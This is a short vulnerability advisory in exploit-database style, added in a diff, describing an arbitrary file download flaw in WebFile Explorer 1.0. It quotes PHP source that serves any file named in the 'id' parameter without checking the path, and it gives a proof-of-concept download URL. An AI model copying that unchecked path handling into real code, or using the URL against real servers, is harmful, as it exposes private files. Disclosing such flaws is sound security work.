@@ -1,0 +1,35 @@
+# # # # #
+# Exploit Title: WebFile Explorer 1.0 - Arbitrary File Download
+# Dork: N/A
+# Date: 09.08.2017
+# Vendor Homepage : http://speicher.host/
+# Software Link: https://codecanyon.net/item/webfile-explorer/20366192/
+# Demo: http://speicher.host/envato/codecanyon/demo/web-file-explorer/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The security obligation allows an attacker to arbitrary download files..
+#
+# Vulnerable Source:
+# 1	.............
+# 2	$file = $_GET['id'];
+# 3	
+# 4	if (file_exists($file)) {
+# 5	    header('Content-Description: File Transfer');
+# 6	    header('Content-Type: application/octet-stream');
+# 7	    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+# 8	    header('Expires: 0');
+# 9	    header('Cache-Control: must-revalidate');
+# 10 .............
+# Proof of Concept:
+# http://localhost/[PATH]/web-file-explorer/download.php?id=WebExplorer/[FILE]
+# 
+# Etc...
+# # # # #
